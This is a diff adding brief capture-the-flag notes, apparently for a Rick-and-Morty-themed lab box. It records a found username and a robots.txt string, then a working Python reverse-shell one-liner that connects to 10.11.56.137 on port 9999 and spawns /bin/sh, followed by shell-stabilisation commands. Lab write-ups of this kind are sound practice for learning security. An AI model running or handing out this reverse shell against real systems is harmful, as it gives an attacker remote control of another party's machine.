@@ -1,0 +1,13 @@
+Username found
+R1ckRul3s
+
+robots.txt
+Wubbalubbadubdub
+
+Reverse shell
+python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.56.137",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
+
+Stablize shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+CTRL+Z ########## background current shell
+stty raw -echo; fg'
